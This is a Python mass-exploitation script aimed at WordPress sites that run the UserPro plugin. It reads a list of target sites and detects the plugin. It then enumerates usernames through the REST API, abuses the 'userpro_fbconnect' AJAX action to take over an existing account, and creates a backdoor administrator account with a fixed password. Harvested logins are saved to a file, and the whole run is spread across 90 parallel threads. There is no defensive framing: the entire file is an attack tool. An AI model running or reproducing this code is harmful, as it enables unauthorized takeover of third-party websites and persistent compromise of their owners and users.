import warnings, sys, re, random
import requests, json, urllib3, string
from colorama import init, Fore
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
from multiprocessing.dummy import Pool
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning, module="bs4")
warnings.filterwarnings(
    "ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)  # Initialize colorama for automatic color reset


try:

    target = [line.strip() for line in open(sys.argv[1], mode='r', encoding='utf-8', errors='ignore').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    print(f'\n {fr} [!] Enter <{path[len(path) - 1]}> <sites.txt>')  
    sys.exit()
    
class CodeX4:
    
    def __init__(self):
        self.print_banner()

        self.headers  = {'Connection': 'keep-alive','Cache-Control': 'max-age=0','Upgrade-Insecure-Requests': '1',
                        'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9,fr;q=0.8','referer': 'www.google.com'}
                        
        self.login = requests.Session()
                        
                        
    
    
    def URLdomain(self, site):
        if site.startswith("http://") :
            site = site.replace("http://","")
        elif site.startswith("https://") :
            site = site.replace("https://","")
            
        elif site.startswith(" ") :
            site = site.replace("","")
        else :
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern,site):
            sitez = re.findall(pattern,site)
            site = sitez[0]
        return site
                        
    def print_banner(self):
        banner = f"""{Fore.CYAN}
        Flash AUTO GET USER PASS
        """
       print(banner)

    
        
        
    def CheckVuln(self, site):
        domain = f"{self.URLdomain(site)}"
        try:
            url = f"https://{self.URLdomain(site)}"
            check = requests.get(f'{url}/wp-content/plugins/userpro/css/userpro.min.css',headers=self.headers , timeout=15 , allow_redirects=False, verify=False)

            if('<html' not in check.text and 'div.userpro-overlay-inner div.userpro' in check.text):
                    open('UserPro-Plugin.txt', 'a').write(site +'\n')
                    return True
                
            else:
                url = f"http://{self.URLdomain(site)}"
                check1 = requests.get(f'{url}/wp-content/plugins/userpro/css/userpro.min.css',headers=self.headers,timeout=15 , allow_redirects=False)

                if('<html' not in check.text and 'div.userpro-overlay-inner div.userpro' in check1.text):
                    open('UserPro-Plugin.txt', 'a').write(site +'\n')
                    
                    #Exploit 
                    return True

    

                else:
                    return False
                    
        except :
            return False
            
    def extract_usernames(self, wordpress_url):
        rest_api_usernames = self.get_usernames_rest_api(wordpress_url)
        all_usernames = set(rest_api_usernames)
        return list(all_usernames)


    # Method 1: Using WordPress REST API
    def get_usernames_rest_api(self, wordpress_url):
        try:
            headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
            api_url = wordpress_url + '/wp-json/wp/v2/users'
            response = requests.get(api_url, headers=headers, verify=False)
            if response.status_code == 200:
                users = response.json()
                usernames = [user['slug'] for user in users]
                ID = [Mid['id'] for Mid in users]
                return usernames, ID
            else:
                print(f"Target:{wordpress_url} --> Failed to fetch usernames using REST API. Error: {response.text}")
                return []
                
        except:
            pass
            
    def add_user_in_wordpress(self, wordpress_url, wpnonce , username, email, password, first_name="", last_name="", url="", role="administrator"):
    
        try:
            headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
            
            
            #print(wordpress_url, wpnonce , username, email, password)

            # Prepare the data for the POST request
            data = {
                'action': 'createuser',
                '_wpnonce_create-user': wpnonce,
                '_wp_http_referer': '/wp-admin/user-new.php',
                'user_login': username,
                'email': email,
                'first_name': first_name,
                'last_name': last_name,
                'url': url,
                'pass1': password,
                'pass2': password,
                'pw_weak': 'on',
                'send_user_notification': '1',
                'role': role,
                'createuser': 'Add New User'
            }

            # Send the POST request
            response = self.login.post(f"{wordpress_url}/wp-admin/user-new.php", data=data, headers=headers, verify=False, timeout=20)

            # Check if the request was successful
            if response.status_code == 200:
                print(f"{Fore.CYAN}[+]Created User Administrator\n           [+]UserName: {username}\n Password: {password}\n[+]Status:Added Successfully.{Fore.RESET}")
                with open('Successfully_UserPro_Logins.txt', 'a') as Wpfile:
                    Wpfile.write(f"{wordpress_url}/wp-login.php:{username}:{password}\n")
                
            else:
                print(f"Target:{wordpress_url}   --> Failed to add user. Status code: {response.status_code}")
                
                
        except:
            pass

    

    def send_request(self, url, username="admin", id=1):
    
        try:
            wordpress_url = f"https://{self.URLdomain(url)}"

            url = f"{wordpress_url}/wp-admin/admin-ajax.php"
                
            headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
                    "Content-Type": "application/x-www-form-urlencoded",
                }

            payload = {
                    "action": "userpro_fbconnect",
                    "id":id,
                    "email":username}

            Request_exploit = self.login.post(url, headers=headers, data=payload, verify=False, timeout=20)
                
                
            Admin_Panel = f"{wordpress_url}/wp-admin/user-new.php"

            response = self.login.get(Admin_Panel, headers=headers, verify=False, timeout=20)
                
            check_string = f"<span class='display-name'>{username}</span>"

            if 'wp-admin-bar-logout' in response.text or check_string in response.text:
                print(f"[+]Target:{wordpress_url}   -----:> {Fore.GREEN}Successfully eXploiTinG {Fore.RESET}")
                print(f"[+]Username: {Fore.GREEN}{username}{Fore.RESET}")
                print(f"[+]Password: {Fore.GREEN}{id}{Fore.RESET}")
                print(f"[+]Admin Url:{Fore.GREEN} {wordpress_url}/wp-admin/{Fore.RESET}")
                    
                match = re.search(r'<input type="hidden" id="_wpnonce_create-user" name="_wpnonce_create-user" value="([^"]+)" />', response.text)

                if match:
                    wpnonce = match.group(1)
                        
                    self.add_user_in_wordpress(
                    wordpress_url,
                    wpnonce,
                    username='X4CORE',
                    email='x4@example.com',
                    password='x4',
                    first_name='x',
                    last_name='core',
                    url='http://example.com',
                    role='administrator')

            else:
                    print(f"[-]Target:{wordpress_url}   ------> {fr} Not --> Vulnerability")
                    
                
        except:
            print(f"[-]Target:{wordpress_url}   ------> {fr} --> Request->Failed")




Scanner_ExpLoiT = CodeX4()


def RunTool(url):
    try:
    
        
        if(Scanner_ExpLoiT.CheckVuln(url)):
            # Get username , id 
            
            select_username = Scanner_ExpLoiT.get_usernames_rest_api(url)
            
            if select_username is not None:
                username = select_username[0][0]
                    
                id = select_username[1][0]
                #       exploit
                Scanner_ExpLoiT.send_request(url, username, id)
            else:
                Scanner_ExpLoiT.send_request(url)
				
        else:
            print(f"[-]Target:{url}   ------> {fr} Not Vulnerability")
    except:
        pass
     


mp = Pool(90)
mp.map(RunTool, target)
mp.close()
mp.join()
